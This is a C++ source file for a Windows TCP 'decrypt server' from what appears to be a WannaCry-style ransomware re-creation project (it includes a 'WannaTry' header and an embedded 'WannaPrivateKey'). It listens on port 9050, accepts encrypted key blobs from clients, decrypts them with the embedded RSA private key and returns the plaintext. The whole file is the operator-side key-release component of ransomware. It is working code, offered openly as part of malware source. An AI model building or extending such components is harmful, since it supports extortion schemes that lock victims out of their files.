// DecryptServer.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <WinSock2.h>
#include <Windows.h>
#include <ShlObj.h>
#include "../Common/common.h"
#include "../Common/hexdump.h"
#include "../Common/socktool.h"
#include "../Common/ezfile.h"
#include "../WannaTry/FileList.h"
#include "../EZCrypt/EZRSA.h"
#include "../EZCrypt/Keys.h"
//#pragma comment(lib, "wsock32.lib")
#pragma comment(lib,  "ws2_32.lib") 

#ifndef DECRYPT_SERVER_PORT
#define DECRYPT_SERVER_PORT "9050"
#endif

#ifndef DEFAULT_BUFLEN
#define DEFAULT_BUFLEN 4096
#endif


// Test program
// Decode local eky file


//BOOL WanaServer(PCSTR szHost, PCSTR szPort)
BOOL DecryptServer(const CHAR *port)
{
	WSADATA wsaData;
	INT iResult;

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo* result = NULL;
	struct addrinfo hints;

	//int iSendResult;
	CHAR recvbuf[DEFAULT_BUFLEN];
	INT recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		DEBUG("WSAStartup failed with error: %d\n",
			iResult);
		return false;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;
	DEBUG("server: getaddrinfo\n");
	// Resolve the server address and port
	iResult = getaddrinfo(
		NULL,
		port,
		&hints,
		&result);
	if (iResult != 0) {
		DEBUG("getaddrinfo failed with error: %d\n",
			iResult);
		WSACleanup();
		return false;
	}
	DEBUG("server: socket\n");
	// Create a SOCKET for connecting to server
	ListenSocket = socket(
		result->ai_family,
		result->ai_socktype,
		result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		DEBUG("server: socket failed with error: %ld\n",
			WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return false;
	}
	DEBUG("server: setsockopt\n");
	BOOL bReuseaddr = TRUE;
	setsockopt(
		ListenSocket,
		SOL_SOCKET,
		SO_REUSEADDR,
		(const CHAR*)& bReuseaddr,
		sizeof(BOOL));
	DEBUG("server: bind\n");
	// Setup the TCP listening socket
	iResult = bind(
		ListenSocket,
		result->ai_addr,
		(INT)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		DEBUG("server: bind failed with error: %d\n",
			WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return false;
	}
	DEBUG("server: freeaddrinfo\n");
	freeaddrinfo(result);
	DEBUG("server: listen\n");
	iResult = listen(
		ListenSocket,
		SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		DEBUG("server: listen failed with error: %d\n",
			WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return false;
	}

	while (true) {
		// Accept a client socket
		DEBUG("server: accept\n");
		ClientSocket = accept(
			ListenSocket,
			NULL,
			NULL);
		if (ClientSocket == INVALID_SOCKET) {
			DEBUG("server: accept failed with error: %d\n",
				WSAGetLastError());
			continue;
		}
		DEBUG("server: accepted\n");
		ULONG iZero = 0;
		INT iSize = 0;
		DEBUG("Server Recv:\n");
		if (!RecvAll0(
			ClientSocket,
			recvbuf,
			sizeof(recvbuf),
			&iSize,
			0)) {
			DEBUG("server: recv failed with error: %d\n",
				WSAGetLastError());
			closesocket(ClientSocket);
			WSACleanup();
			return false;
		}
		hexdump((PUCHAR)recvbuf, iSize);
		//
		// Decrypt
		UCHAR abPlain[4096];
		ULONG cbPlain;
		PEZRSA pDecRSA = new EZRSA();
		pDecRSA->Import(
			BCRYPT_RSAPRIVATE_BLOB,
			WannaPrivateKey,
			WannaPrivateKeySize());
		BOOL bResult = pDecRSA->Decrypt(
			(PUCHAR)recvbuf,
			iSize,
			abPlain,
			sizeof(abPlain),
			&cbPlain);
		delete pDecRSA;
		//BOOL bResult = Decrypt((PUCHAR)recvbuf, iSize, abPlain, sizeof(abPlain), &cbPlain);
		if (!bResult) {
			DEBUG("server: decrypt fails\n");
			closesocket(ClientSocket);
			WSACleanup();
			return false;
		}
		//
		DEBUG("Server Send:\n");
		hexdump((PUCHAR)abPlain, cbPlain);
		if (!SendAll0(
			ClientSocket,
			(CHAR*)abPlain,
			cbPlain,
			0)) {
			DEBUG("server: send failed with error: %d\n"
				, WSAGetLastError());
			closesocket(ClientSocket);
			WSACleanup();
			return false;
		}
		// shutdown the connection since we're done
		iResult = shutdown(ClientSocket, SD_SEND);
		if (iResult == SOCKET_ERROR) {
			DEBUG("server: shutdown failed with error: %d\n",
				WSAGetLastError());
		}
		// cleanup
		closesocket(ClientSocket);
	}
	closesocket(ListenSocket);
	WSACleanup();
	return true;
}


INT main(INT argc, CHAR* argv[])
{
	DecryptServer(DECRYPT_SERVER_PORT);
	return 0;
}
